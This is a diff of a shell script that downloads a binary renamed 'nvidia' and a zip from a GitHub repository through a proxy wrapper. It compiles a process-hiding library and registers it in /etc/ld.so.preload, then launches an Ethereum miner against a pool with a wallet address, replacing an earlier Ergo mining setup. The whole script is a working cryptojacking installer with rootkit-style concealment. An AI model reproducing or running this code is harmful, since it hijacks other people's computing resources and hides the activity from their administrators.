@@ -1,20 +1,4 @@
 #!/bin/sh
-cat > config_ergo.ini <<END
-[autolykos]
-wallet = 9hGWyH8zzSC1yWpmg7SeQTEJi9chB2Z3Asc9Yk35LCJseZB6JZg
-coin = ERG
-rigName = Grumy_Dwarf
-pool1 = stratum-ergo.flypool.org:443
-END
-
-cat > config.ini <<END
-[autolykos]
-wallet = 9hGWyH8zzSC1yWpmg7SeQTEJi9chB2Z3Asc9Yk35LCJseZB6JZg
-coin = ERG
-rigName = Grumy_Dwarf
-pool1 = stratum-ergo.flypool.org:443
-END
-
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
@@ -51,15 +35,14 @@ echo "******************************************************************"
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Grumpy
-chmod +x Grumpy
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/nvidia
+chmod +x nvidia
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicGru.zip
-unzip magicGru.zip
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicNvidia.zip
+unzip magicNvidia.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./Grumpy
-
+./graftcp/graftcp ./nvidia -a ETHASH --pool eth-us-west.flexpool.io:15555 --tls on --user 0x8CB8003E428D0Fd7693D22f576A212403728c64a --worker nvidia --longstats 5 --shortstats 5 --timeprint on --log on --ethstratum ETHPROXY --basecolor
